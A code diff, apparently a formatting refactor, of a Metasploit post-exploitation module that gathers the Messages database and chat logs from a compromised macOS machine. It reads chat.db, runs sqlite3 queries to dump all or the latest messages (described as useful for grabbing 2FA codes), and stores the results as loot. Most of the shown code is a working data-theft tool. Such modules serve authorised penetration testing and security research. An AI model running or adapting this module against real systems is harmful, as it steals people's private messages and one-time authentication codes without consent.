@@ -7,59 +7,56 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'OS X Gather Messages',
-      'Description'   => %q{
-        This module will collect the Messages sqlite3 database files and chat logs
-        from the victim's machine. There are four actions you may choose: DBFILE,
-        READABLE, LATEST, and ALL. DBFILE and READABLE will retrieve all messages, and
-        LATEST will retrieve the last X number of messages (useful with 2FA). Module
-        was tested with OS X 10.11 (El Capitan).
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => ['Geckom <geckom[at]redteamr.com>'],
-      'Platform'      => ['osx'],
-      'SessionTypes'  => ['meterpreter', 'shell'],
-      'Actions'       =>
-        [
-          ['DBFILE',   'Description' => 'Collect Messages DB file'],
-          ['READABLE', 'Description' => 'Collect Messages DB and download in a readable format'],
-          ['LATEST',   'Description' => 'Collect the latest message'],
-          ['ALL',      'Description' => 'Collect all Messages data']
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'OS X Gather Messages',
+        'Description' => %q{
+          This module will collect the Messages sqlite3 database files and chat logs
+          from the victim's machine. There are four actions you may choose: DBFILE,
+          READABLE, LATEST, and ALL. DBFILE and READABLE will retrieve all messages, and
+          LATEST will retrieve the last X number of messages (useful with 2FA). Module
+          was tested with OS X 10.11 (El Capitan).
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Geckom <geckom[at]redteamr.com>'],
+        'Platform' => ['osx'],
+        'SessionTypes' => ['meterpreter', 'shell'],
+        'Actions' => [
+          ['DBFILE', { 'Description' => 'Collect Messages DB file' }],
+          ['READABLE', { 'Description' => 'Collect Messages DB and download in a readable format' }],
+          ['LATEST', { 'Description' => 'Collect the latest message' }],
+          ['ALL', { 'Description' => 'Collect all Messages data' }]
         ],
-      'DefaultAction' => 'ALL'
-    ))
+        'DefaultAction' => 'ALL',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
         OptInt.new('MSGCOUNT', [false, 'Number of latest messages to retrieve.', 3]),
-        OptString.new('USER',  [false, 'Username to retrieve messages from (defaults to current user)'])
+        OptString.new('USER', [false, 'Username to retrieve messages from (defaults to current user)'])
       ]
     )
   end
 
   def run
-    if datastore['USER']
-      user = datastore['USER']
-    else
-      user = cmd_exec('/usr/bin/whoami')
-    end
+    user = datastore['USER'] || cmd_exec('/usr/bin/whoami')
 
     # Check file exists
     messages_path = "/Users/#{user}/Library/Messages/chat.db"
-    if file_exist?(messages_path)
-      print_good("#{peer} - Messages DB found: #{messages_path}")
-    else
+
+    unless file_exist?(messages_path)
       fail_with(Failure::Unknown, "#{peer} - Messages DB does not exist")
     end
 
-    # Check messages.  And then set the default profile path
-    unless messages_path
-      fail_with(Failure::Unknown, "#{peer} - Unable to find messages, will not continue")
-    end
-
-    print_good("#{peer} - Found Messages file: #{messages_path}")
+    print_good("#{peer} - Messages DB found: #{messages_path}")
 
     files = []
 
@@ -77,7 +74,7 @@ class MetasploitModule < Msf::Post
   def get_db(messages_path)
     print_status("#{peer} - Looting #{messages_path} database")
     message_data = read_file(messages_path)
-    {filename: 'messages.db', mime: 'bin', data: message_data}
+    { filename: 'messages.db', mime: 'bin', data: message_data }
   end
 
   #
@@ -99,7 +96,7 @@ class MetasploitModule < Msf::Post
     ]
     sql = sql.join(' ')
     readable_data = cmd_exec("sqlite3 #{messages_path} '#{sql}'")
-    {filename: 'messages.txt', mime: 'text/plain', data: readable_data}
+    { filename: 'messages.txt', mime: 'text/plain', data: readable_data }
   end
 
   #
@@ -122,7 +119,7 @@ class MetasploitModule < Msf::Post
     sql = sql.join(' ')
     latest_data = cmd_exec("sqlite3 #{messages_path} '#{sql}'")
     print_good("#{peer} - Latest messages: \n#{latest_data}")
-    {filename: 'latest.txt', mime: 'text/plain', data: latest_data}
+    { filename: 'latest.txt', mime: 'text/plain', data: latest_data }
   end
 
   #
@@ -130,13 +127,14 @@ class MetasploitModule < Msf::Post
   #
   def save(data)
     data.each do |e|
-      e[:filename] = e[:filename].gsub(/\\ /,'_')
+      e[:filename] = e[:filename].gsub(/\\ /, '_')
       p = store_loot(
         e[:filename],
         e[:mime],
         session,
         e[:data],
-        e[:filename])
+        e[:filename]
+      )
 
       print_good("#{peer} - #{e[:filename]} stored as: #{p}")
     end
